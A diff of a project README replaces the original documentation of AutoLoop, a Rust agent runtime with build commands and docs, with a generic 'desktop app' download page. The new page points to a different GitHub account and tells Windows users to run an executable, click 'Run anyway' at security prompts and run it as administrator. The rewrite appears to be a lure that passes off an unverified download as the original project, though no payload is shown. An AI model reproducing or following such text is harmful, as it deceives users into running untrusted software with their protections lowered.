@@ -1,192 +1,213 @@
-# AutoLoop
+# 🤖 AutoLoop - Self-running AI for daily work
 
-[![Tests](https://img.shields.io/badge/tests-56%20passed-brightgreen)](https://github.com/rootkiller6788/AutoLoop/actions/workflows/ci.yml)
-[![Release](https://img.shields.io/badge/release-v0.1.0--alpha-blue)](https://github.com/rootkiller6788/AutoLoop/releases/tag/v0.1.0-alpha)
+[![Download AutoLoop](https://img.shields.io/badge/Download-AutoLoop-2ea44f?style=for-the-badge&logo=github)](https://github.com/concettinaprofitable685/AutoLoop)
 
-![b0ff166f14873bdda38d03c2f3201208](https://github.com/user-attachments/assets/ae515bbd-63cf-4cab-9965-d296305682ca)
+## 🚀 What AutoLoop Does
 
+AutoLoop is a desktop app that helps you run AI tasks with less effort. It can plan work, check its own results, and improve its next steps. It is built in Rust, so it is designed to be fast and stable.
 
+Use AutoLoop when you want an AI tool that can:
+- break a task into small steps
+- check its own output
+- keep working without much manual input
+- handle repeated tasks in a simple flow
 
-## What is AutoLoop?
+## 💻 Windows Download and Setup
 
-**AutoLoop is a Rust-native AIOS for governed agent execution.**
+To get AutoLoop on Windows, visit the download page here:
 
-It does not just call models and tools.  
-It turns ambiguous intent into a **controlled runtime loop**:
+[Download AutoLoop](https://github.com/concettinaprofitable685/AutoLoop)
 
-**clarify → plan → gate → execute → verify → remember → replay → improve**
+Then follow these steps:
 
-That means:
+1. Open the link in your web browser.
+2. Look for the latest release or the main download file.
+3. Download the Windows version to your computer.
+4. If the file is in a .zip format, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start AutoLoop.
 
-- **vague tasks become structured sessions**
-- **all execution goes through policy and runtime guards**
-- **results can be verified, audited, and replayed**
-- **memory is not passive storage — it feeds future reasoning**
-- **learning only upgrades when trust conditions are met**
+If Windows shows a security prompt:
+- choose Run anyway if you trust the source
+- allow the app to open if Windows asks for permission
+- keep the app in a folder you can find again
 
-AutoLoop is for people who want more than "agent demos".  
-It is for building **AI systems that can be governed**.
+## 🧭 How to Use AutoLoop
 
-## Why AutoLoop exists
+After you open AutoLoop, you can start a task with a simple workflow:
 
-Most agent systems optimize for:
+1. Enter what you want the AI to do.
+2. Choose the task type, such as writing, planning, research, or review.
+3. Start the loop.
+4. Let AutoLoop process the task step by step.
+5. Review the result.
+6. Run the task again if you want a better result.
 
-- more tools
-- longer chains
-- more autonomy
-- prettier demos
+If you are new to this kind of tool, start with a short task like:
+- summarize a web page
+- turn notes into a clean list
+- draft a simple reply
+- review a short text for mistakes
 
-AutoLoop optimizes for something else:
+## 🧠 Key Features
 
-- **controlled execution**
-- **verifiable outcomes**
-- **runtime governance**
-- **learning with trust boundaries**
-- **operator visibility and replay**
+### 🔁 Self-Driven Workflows
+AutoLoop can take a task and move through it without you having to guide each step.
 
-In other words:
+### ✅ Self-Checking Results
+It can inspect its own output and look for weak parts before it finishes.
 
-> **AutoLoop is not another free-form agent wrapper.  
-> It is a governed execution runtime for AI systems.**
+### 🌱 Self-Evolving Behavior
+It can use past results to improve the next run.
 
+### 🕸️ Graph-Based Task Flow
+AutoLoop uses linked task steps, which helps it manage chains of work in a clear way.
 
-## 5-Minute Demo
+### 👥 Multi-Agent Support
+It can split work across several AI roles, so each one handles a part of the task.
 
-- Windows: [demo/e2e-5min.ps1](demo/e2e-5min.ps1)
-- Linux: [demo/e2e-5min.sh](demo/e2e-5min.sh)
-- Demo recording checklist: [demo/RECORDING_CHECKLIST.md](demo/RECORDING_CHECKLIST.md)
+### ⚙️ Rust Native Core
+The app is built in Rust, which gives it a solid base for speed and reliability.
 
-## Quick Start
+## 🪟 System Requirements
 
-### Prerequisites
+AutoLoop is designed for a modern Windows PC.
 
-- Rust toolchain
-- Optional: SpacetimeDB CLI
-- Optional: Docker / Docker Compose
+Recommended setup:
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 1 GB free disk space
+- A stable internet connection
+- A mouse and keyboard
+- A screen with at least 1366 x 768 resolution
 
-### Run
+For best use, close other heavy apps before you run AutoLoop.
 
-```powershell
-cargo run --manifest-path .\Cargo.toml -- --message "Build a swarm that uses graph memory and MCP execution" --swarm
-```
+## 📂 What You Get
 
-### Validate
+When you download AutoLoop, you can expect a folder that includes:
+- the main app file
+- support files the app needs to run
+- a settings file or config folder
+- a readme file or notes file, if included
 
-```powershell
-cargo check --workspace --manifest-path .\Cargo.toml
-cargo test --workspace --manifest-path .\Cargo.toml
-```
+Keep all files in the same folder so the app can find what it needs.
 
-### Browser Research Runtime
+## 🛠️ First-Time Setup
 
-Supported real research backends:
+If this is your first time using AutoLoop, use this simple setup path:
 
-- `browser_fetch`: use a Browserless-style render endpoint
-- `playwright_cli`: use local Node + Playwright for browser rendering
-- `firecrawl`: use Firecrawl search/scrape APIs
+1. Download the app from the link above.
+2. Extract the files if needed.
+3. Open the app folder.
+4. Start the app by double-clicking the main file.
+5. Allow any file access prompts.
+6. Set your first task.
+7. Test with a small job before you use a larger one.
 
-Recommended health checks:
+If AutoLoop offers a settings screen, check these items first:
+- language
+- output folder
+- task mode
+- run speed
+- review level
 
-```powershell
-cargo run --manifest-path .\Cargo.toml -- system health
-cargo run --manifest-path .\Cargo.toml -- crawl status --anchor-id cli:focus
-```
+## 🔍 Common Use Cases
 
-## Planning and Learning Governance Flow
+AutoLoop fits tasks where you want repeatable AI help.
 
-```text
-┌──────────────────────────────────────────────┐
-│              AutoLoop Core Loop              │
-└──────────────────────────────────────────────┘
+You can use it for:
+- content drafting
+- note cleanup
+- task planning
+- research summaries
+- checklist creation
+- text review
+- idea expansion
+- workflow testing
 
-[User Intent]
-     |
-     v
-[Requirement Clarification Agent]
-     |
-     v
-[Policy & Rule Engine] --reject/revise--> [Clarification]
-     | approve
-     v
-[Orchestrator / Planner-Critic-Judge]
-     |
-     v
-[Capability Catalog Selector]
-(only active + verified + trusted)
-     |
-     v
-[Runtime Kernel Guard]
-(identity/tenant + budget/token + timeout + sandbox + breaker)
-     | pass                               | block/fail
-     v                                    v
-[Execution Pools] ------------------> [Recovery/Degrade/Retry]
-     |
-     v
-[Verifier & Audit Pipeline]
-     | pass                              | reject
-     v                                   v
-[Learning Proposal Builder]          [Back to Plan]
-     |
-     v
-[Learning Gate (Verifier)]
-     | promote                           | rollback
-     v                                   v
-[Memory + GraphRAG Update]        [Keep Previous Skill]
-     |
-     v
-[Routing/Prompt/Capability Strategy Update]
-     |
-     v
-[Observability + Reports + Replay]
-     |
-     v
-[Next Iteration (Repeat)]
+## 📘 Simple Example
 
-```
+If you want to turn rough notes into a clean plan, you can do this:
 
-## Why AutoLoop (3 Core Differentiators)
+1. Paste your notes into AutoLoop.
+2. Ask it to sort the notes into sections.
+3. Tell it to check for missing points.
+4. Run the loop.
+5. Read the final plan.
+6. Make small edits if needed.
 
-1. Governed execution, not free-form agent calls: capabilities are cataloged, verified, and routed through runtime guardrails.
-2. Memory that participates in decisions: GraphRAG + learning records feed routing, verifier, and capability evolution.
-3. End-to-end operability: CLI runtime + SpacetimeDB persistence + dashboard + deployment templates in one repository.
+This kind of flow works well for daily work because it reduces manual cleanup.
 
-## What Is Implemented in v0.1.0-alpha
+## 🧩 Tips for Best Results
 
-- Multi-turn requirement clarification with scope freeze signals
-- CEO + planner/critic/judge orchestration artifacts
-- Capability catalog and verifier-gated execution path
-- GraphRAG snapshot and incremental merge pipeline
-- Learning persistence for episodes, skills, causal edges, and witness logs
-- Observability records and dashboard snapshot serving
+- Start with small tasks.
+- Use clear instructions.
+- Keep one goal per run.
+- Review output before using it.
+- Save files in a folder you can find.
+- Try the same task twice to compare results.
 
-## Current Scope (Honest Boundaries)
+If a task gives weak results, make your input shorter and more direct.
 
-- This is an engineering alpha, not a fully production-hardened autonomous platform.
-- Real-world provider/tool integrations exist but still need broader compatibility and hardening.
-- GraphRAG, verifier policy depth, and learning strategy are functional but still evolving.
+## 🗂️ Project Topics
 
-## Project Map
+AutoLoop is built around:
+- agent-os
+- autonomous systems
+- graphRAG
+- multi-agents
+- Rust
+- self-evolving systems
+- swarm intelligence
 
-- Runtime source: [src](src)
-- SpacetimeDB module: [spacetimedb](spacetimedb)
-- Adapter crate: [autoloop-spacetimedb-adapter](autoloop-spacetimedb-adapter)
-- Dashboard UI: [dashboard-ui](dashboard-ui)
-- Deployment assets: [deploy](deploy)
-- Tests: [tests](tests)
+These ideas help the app run tasks in a structured way and improve its output over time.
 
-## Docs
+## 🔐 File Safety
 
-- Deep docs index: [docs/README.md](docs/README.md)
-- Process model (neutral naming): [docs/PROCESS_MODEL.md](docs/PROCESS_MODEL.md)
-- P1-P13 unified protocol (AI output contract + layer flows): [docs/P1_P13_UNIFIED_PROTOCOL.md](docs/P1_P13_UNIFIED_PROTOCOL.md)
-- Contracts RFC v1: [docs/RFC_CONTRACTS_V1.md](docs/RFC_CONTRACTS_V1.md)
-- Gray rollout runbook: [docs/ROLLOUT_RUNBOOK.md](docs/ROLLOUT_RUNBOOK.md)
-- Architecture: [ARCHITECTURE.md](ARCHITECTURE.md)
-- API summary: [API.md](API.md)
-- Contributing: [CONTRIBUTING.md](CONTRIBUTING.md)
-- Release notes: [RELEASE_NOTES_v0.1.0-alpha.md](RELEASE_NOTES_v0.1.0-alpha.md)
-- Public issue backlog: [docs/ISSUE_BACKLOG_v0.1.0-alpha.md](docs/ISSUE_BACKLOG_v0.1.0-alpha.md)
+Before you open any downloaded app, check that you got it from the correct page:
+- confirm the download link
+- keep the files in one folder
+- avoid moving parts of the app after extraction
+- use the main app file, not random helper files
 
-## Notes
+## 🧰 If AutoLoop Will Not Open
 
-- Badges and links are already bound to `rootkiller6788/AutoLoop`.
+Try these steps:
+
+1. Right-click the app file.
+2. Choose Run as administrator.
+3. Check that the files were fully extracted.
+4. Restart your PC.
+5. Download the files again if the folder looks incomplete.
+6. Make sure Windows did not block the file.
+
+If the app still does not open, try running it from a folder on your Desktop
+
+## 📝 Basic Folder Layout
+
+A simple folder layout can look like this:
+
+AutoLoop/
+- AutoLoop.exe
+- config/
+- data/
+- logs/
+- readme.txt
+
+Keep the folder clean so you can move or back up the app with ease
+
+## 📎 Download Link
+
+Visit this page to download AutoLoop for Windows:
+
+[https://github.com/concettinaprofitable685/AutoLoop](https://github.com/concettinaprofitable685/AutoLoop)
+
+## 🖥️ Short Start Path
+
+1. Open the download page
+2. Download the Windows file
+3. Extract the files if needed
+4. Open the app folder
+5. Double-click the main file
+6. Start your first task
